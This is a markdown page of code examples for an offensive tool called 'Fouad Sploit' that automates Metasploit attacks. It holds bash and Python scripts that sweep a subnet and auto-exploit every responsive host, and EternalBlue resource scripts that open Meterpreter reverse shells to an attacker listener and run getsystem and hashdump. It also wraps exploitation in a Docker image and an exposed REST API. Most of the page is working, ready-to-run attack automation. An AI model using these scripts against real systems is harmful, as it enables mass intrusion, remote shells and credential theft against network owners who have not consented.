# 💻 Fouad Sploit - Code Examples & Snippets

## Python Script Execution Examples

### Basic Import and Usage

```python
#!/usr/bin/env python3
from fouad_sploit import *

# Initialize
print_banner()

# Get local IP
my_ip = get_local_ip()
print(f"My IP: {my_ip}")

# Scan ports
target = "192.168.1.100"
open_ports = detect_open_ports(target)
print(f"Open ports: {open_ports}")
```

## Shell Script Integration

### Bash Script for Automated Testing

```bash
#!/bin/bash

# Fouad Sploit Automation Script
TARGET_LIST="targets.txt"
OUTPUT_DIR="results"

mkdir -p $OUTPUT_DIR

echo "[+] Starting Fouad Sploit Batch Execution"

while IFS= read -r target; do
    echo "[*] Testing target: $target"
    
    ./fouad_sploit.py \
        --auto \
        --target "$target" \
        --output "$OUTPUT_DIR/exploit_${target}.rc" \
        | tee "$OUTPUT_DIR/log_${target}.txt"
    
    sleep 5
done < "$TARGET_LIST"

echo "[+] Batch execution completed"
```

### Create targets.txt

```bash
# Create a list of targets
cat > targets.txt << EOF
192.168.1.100
192.168.1.101
192.168.1.102
EOF
```

## Metasploit Resource Script (.rc) Examples

### Auto-Generated Script Structure

```ruby
# Fouad Sploit - Auto-generated Resource Script
# Target: 192.168.1.100:445
# Generated: 2025-09-30 12:33:31

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set RPORT 445
set LHOST 192.168.1.50
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

# Advanced Options
set AutoVerifySession true
set InitialAutoRunScript ""
set VERBOSE true

# Exploit Options
exploit -j -z
```

### Custom Post-Exploitation Script

```ruby
# Enhanced exploitation with post-exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set RPORT 445
set LHOST 192.168.1.50
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp
set AutoRunScript multi_console_command -r /root/post_exploit.rc
exploit -j -z

# Post-exploitation commands
sleep 10
sessions -i 1
sysinfo
getuid
getsystem
hashdump
screenshot
```

## Advanced Python Integration

### Custom Exploit Module

```python
#!/usr/bin/env python3
"""
Custom Fouad Sploit Module
"""

import sys
sys.path.append('/home/kali/Desktop/New Folder 2')

from fouad_sploit import (
    print_banner,
    print_status,
    get_local_ip,
    detect_open_ports,
    suggest_exploits,
    generate_msf_rc,
    create_resource_file,
    run_metasploit
)

def custom_attack(target, port=None):
    """Custom attack workflow"""
    print_banner()
    
    # Auto-detect configuration
    lhost = get_local_ip()
    lport = 4444
    
    # Scan if port not specified
    if not port:
        print_status(f"Scanning {target}...", 'info')
        ports = detect_open_ports(target)
        if ports:
            port = ports[0]
        else:
            print_status("No open ports found", 'error')
            return False
    
    # Get exploit suggestions
    exploits = suggest_exploits(port)
    if not exploits:
        print_status("No exploits available", 'warning')
        return False
    
    exploit = exploits[0]
    
    # Generate and run
    print_status(f"Using exploit: {exploit}", 'exploit')
    rc_content = generate_msf_rc(target, port, lhost, lport, exploit)
    rc_file = create_resource_file(rc_content, 'custom_attack.rc')
    
    return run_metasploit(rc_file)

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else input("Target: ")
    custom_attack(target)
```

## Network Scanning Integration

### Combine with Nmap

```bash
#!/bin/bash

TARGET="192.168.1.0/24"

echo "[+] Scanning network with Nmap..."
nmap -sV -p 445,3389,80,443 $TARGET -oG scan.txt

echo "[+] Parsing results and running Fouad Sploit..."

grep "open" scan.txt | awk '{print $2}' | while read ip; do
    echo "[*] Exploiting: $ip"
    ./fouad_sploit.py -a -t $ip
done
```

### Python Nmap Integration

```python
#!/usr/bin/env python3
import nmap
from fouad_sploit import *

def scan_and_exploit(network):
    """Scan network and auto-exploit"""
    print_banner()
    
    nm = nmap.PortScanner()
    print_status(f"Scanning network: {network}", 'info')
    
    nm.scan(hosts=network, arguments='-sV -p 445,3389,80,443')
    
    for host in nm.all_hosts():
        print_status(f"Found host: {host}", 'success')
        
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            
            for port in ports:
                state = nm[host][proto][port]['state']
                if state == 'open':
                    print_status(f"Open port: {port}", 'exploit')
                    # Auto exploit
                    config = auto_mode(target=host, auto_scan=False)
                    if config:
                        # Execute exploit
                        pass

if __name__ == '__main__':
    scan_and_exploit('192.168.1.0/24')
```

## Docker Integration

### Dockerfile

```dockerfile
FROM kalilinux/kali-rolling

# Install dependencies
RUN apt-get update && apt-get install -y \
    metasploit-framework \
    python3 \
    python3-pip \
    nmap \
    && apt-get clean

# Copy tool
WORKDIR /opt/fouad-sploit
COPY fouad_sploit.py .
COPY logo.png .

RUN chmod +x fouad_sploit.py

# Set entrypoint
ENTRYPOINT ["./fouad_sploit.py"]
CMD ["--help"]
```

### Docker Compose

```yaml
version: '3.8'

services:
  fouad-sploit:
    build: .
    container_name: fouad-sploit
    network_mode: host
    volumes:
      - ./results:/opt/fouad-sploit/results
    environment:
      - TARGET=${TARGET}
      - AUTO_MODE=true
```

### Build and Run

```bash
# Build Docker image
docker build -t fouad-sploit:latest .

# Run in auto mode
docker run --rm --network host \
    -v $(pwd)/results:/opt/fouad-sploit/results \
    fouad-sploit:latest --auto --target 192.168.1.100

# Interactive mode
docker run -it --rm --network host fouad-sploit:latest --interactive
```

## API Integration (Future Enhancement)

### REST API Wrapper

```python
#!/usr/bin/env python3
"""
Fouad Sploit REST API
"""

from flask import Flask, request, jsonify
from fouad_sploit import *

app = Flask(__name__)

@app.route('/api/scan', methods=['POST'])
def api_scan():
    data = request.json
    target = data.get('target')
    
    if not target:
        return jsonify({'error': 'Target required'}), 400
    
    ports = detect_open_ports(target)
    return jsonify({
        'target': target,
        'open_ports': ports,
        'services': {p: get_service_name(p) for p in ports}
    })

@app.route('/api/exploit', methods=['POST'])
def api_exploit():
    data = request.json
    config = auto_mode(target=data.get('target'))
    
    if config:
        rc_content = generate_msf_rc(
            config['target'],
            config['port'],
            config['lhost'],
            config['lport'],
            config['exploit'],
            config['payload']
        )
        rc_file = create_resource_file(rc_content)
        
        return jsonify({
            'status': 'success',
            'config': config,
            'rc_file': rc_file
        })
    
    return jsonify({'error': 'Configuration failed'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

### API Usage

```bash
# Scan endpoint
curl -X POST http://localhost:5000/api/scan \
    -H "Content-Type: application/json" \
    -d '{"target": "192.168.1.100"}'

# Exploit endpoint
curl -X POST http://localhost:5000/api/exploit \
    -H "Content-Type: application/json" \
    -d '{"target": "192.168.1.100", "auto": true}'
```

## Penetration Testing Workflow

### Complete Engagement Script

```bash
#!/bin/bash
# Complete Penetration Test with Fouad Sploit

PROJECT_NAME="test-$(date +%Y%m%d)"
RESULTS_DIR="results/$PROJECT_NAME"

mkdir -p $RESULTS_DIR

echo "[+] Starting Penetration Test: $PROJECT_NAME"

# Phase 1: Reconnaissance
echo "[*] Phase 1: Network Discovery"
nmap -sn 192.168.1.0/24 -oG $RESULTS_DIR/hosts.txt

# Phase 2: Port Scanning
echo "[*] Phase 2: Port Scanning"
cat $RESULTS_DIR/hosts.txt | grep "Up" | awk '{print $2}' > $RESULTS_DIR/targets.txt

# Phase 3: Exploitation
echo "[*] Phase 3: Exploitation with Fouad Sploit"
while read target; do
    echo "[>] Attacking: $target"
    ./fouad_sploit.py \
        --auto \
        --target $target \
        --output "$RESULTS_DIR/exploit_${target}.rc" \
        2>&1 | tee "$RESULTS_DIR/log_${target}.txt"
done < $RESULTS_DIR/targets.txt

echo "[+] Penetration Test Completed"
echo "[+] Results saved in: $RESULTS_DIR"
```

## 📧 Contact

**Developer:** Fouad  
**Email:** zalaffouad37@gmail.com  
**Instagram:** [@1.pvl](https://instagram.com/1.pvl)

---

**Made with ❤️ by Fouad | © 2025**
